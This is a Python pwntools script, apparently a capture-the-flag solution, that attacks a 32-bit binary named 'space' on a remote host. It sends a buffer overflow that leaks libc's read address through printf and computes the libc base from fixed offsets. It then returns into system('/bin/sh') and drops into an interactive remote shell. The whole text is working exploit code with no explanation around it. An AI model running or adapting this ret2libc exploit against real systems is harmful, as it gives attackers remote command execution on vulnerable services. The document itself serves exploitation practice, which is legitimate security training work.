from pwn import *

address = '94.237.51.112'
port = 56060

context.log_level = 'critical'
context.binary = binary = ELF('./space')

printf_plt = binary.plt['printf']
read_got = binary.got['read']
main = binary.sym['main']

read_offset = 0xf4410
system_offset = 0x45420
bin_sh_offset = 0x18f352

overflow = b'A' * 18

payload = overflow
payload += p32(printf_plt)
payload += p32(main)
payload += p32(read_got)

with remote(address, port) as target:
	target.sendlineafter(b'> ', payload)

	libc_read = u32(target.recv(4))
	libc_base = libc_read - read_offset

	system = libc_base + system_offset
	bin_sh = libc_base + bin_sh_offset

	payload = overflow
	payload += p32(system)
	payload += p32(main)
	payload += p32(bin_sh)

	target.sendlineafter(b'> ', payload)
	target.interactive()
